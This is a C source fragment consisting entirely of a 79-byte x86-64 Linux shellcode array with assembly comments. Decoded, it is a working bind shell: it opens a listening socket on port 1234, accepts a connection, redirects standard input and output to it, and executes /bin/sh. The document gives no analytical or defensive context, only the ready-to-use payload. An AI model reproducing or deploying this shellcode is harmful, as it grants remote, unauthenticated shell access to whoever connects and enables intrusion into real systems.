
#define BS_SIZE 79

char BS[] = {
  /* 0000 */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x54"                                     /* push rsp                    */
  /* 000F */ "\x5d"                                     /* pop rbp                     */
  /* 0010 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0012 */ "\x58"                                     /* pop rax                     */
  /* 0013 */ "\x99"                                     /* cdq                         */
  /* 0014 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0016 */ "\x5e"                                     /* pop rsi                     */
  /* 0017 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0019 */ "\x5f"                                     /* pop rdi                     */
  /* 001A */ "\x0f\x05"                                 /* syscall                     */
  /* 001C */ "\x97"                                     /* xchg edi, eax               */
  /* 001D */ "\x55"                                     /* push rbp                    */
  /* 001E */ "\x5e"                                     /* pop rsi                     */
  /* 001F */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0021 */ "\xb0\x31"                                 /* mov al, 0x31                */
  /* 0023 */ "\x0f\x05"                                 /* syscall                     */
  /* 0025 */ "\x50"                                     /* push rax                    */
  /* 0026 */ "\x5e"                                     /* pop rsi                     */
  /* 0027 */ "\xb0\x32"                                 /* mov al, 0x32                */
  /* 0029 */ "\x0f\x05"                                 /* syscall                     */
  /* 002B */ "\xb0\x2b"                                 /* mov al, 0x2b                */
  /* 002D */ "\x0f\x05"                                 /* syscall                     */
  /* 002F */ "\x97"                                     /* xchg edi, eax               */
  /* 0030 */ "\x96"                                     /* xchg esi, eax               */
  /* 0031 */ "\x6a\x21"                                 /* push 0x21                   */
  /* 0033 */ "\x58"                                     /* pop rax                     */
  /* 0034 */ "\x0f\x05"                                 /* syscall                     */
  /* 0036 */ "\xff\xce"                                 /* dec esi                     */
  /* 0038 */ "\x79\xf7"                                 /* jns 0x31                    */
  /* 003A */ "\x99"                                     /* cdq                         */
  /* 003B */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 003D */ "\x52"                                     /* push rdx                    */
  /* 003E */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 0048 */ "\x51"                                     /* push rcx                    */
  /* 0049 */ "\x54"                                     /* push rsp                    */
  /* 004A */ "\x5f"                                     /* pop rdi                     */
  /* 004B */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 004D */ "\x0f\x05"                                 /* syscall                     */
};